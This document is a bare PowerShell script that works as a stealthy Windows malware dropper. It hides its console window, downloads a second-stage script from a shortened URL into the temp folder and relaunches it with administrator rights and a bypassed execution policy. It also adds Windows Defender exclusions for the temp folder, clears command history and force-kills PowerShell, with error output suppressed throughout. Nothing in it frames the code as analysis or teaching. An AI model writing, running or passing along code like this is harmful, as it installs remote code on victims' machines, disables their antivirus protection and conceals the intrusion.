# FIRST THINGS FIRST
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class ConsoleWindow {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;

        public static void Hide() {
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_HIDE);
        }

        public static void Show() {
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_SHOW);
        }
    }
"@


# Hide the console window
[ConsoleWindow]::Hide()

# Define the URL of the file to download
$url = "https://lnkfwd.com/u/KtRiC0kh"

# Define the destination path in the %TEMP% directory
$destination = "$env:TEMP\ftf.ps1"

# Use Invoke-WebRequest to download the file with error handling
try {
    [ConsoleWindow]::Hide()
    Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
    # Output the path to confirm where the file was saved
    #Write-Output "File downloaded to: $destination"
} catch {
    #Write-Output "Error: Unable to download file from $url"
}

# Check if the script is running with elevated privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    
    [ConsoleWindow]::Hide()
    # Define the path to %TEMP%\ftf.ps1
    $scriptPath = "$env:TEMP\ftf.ps1"

    try {
        [ConsoleWindow]::Hide()
        # Relaunch the script with elevated privileges
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -ErrorAction Stop
        exit
    } catch {
        #Write-Output "Error: Unable to relaunch the script with elevated privileges."
    }
}

# Set the execution policy with error handling
try {
    [ConsoleWindow]::Hide()
    Set-ExecutionPolicy RemoteSigned -Force -ErrorAction Stop
} catch {
    #Write-Output "Error: Unable to set execution policy."
}

# Add Exclusion in Windows Defender with error handling
try {
    [ConsoleWindow]::Hide()
    Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe" -ErrorAction SilentlyContinue
} catch {
    #Write-Output "Error: Unable to add exclusions to Windows Defender."
}


# Clear history (no error handling required, as it's safe)
Clear-History


Start-Sleep -Seconds 1

Get-Process powershell | Stop-Process -Force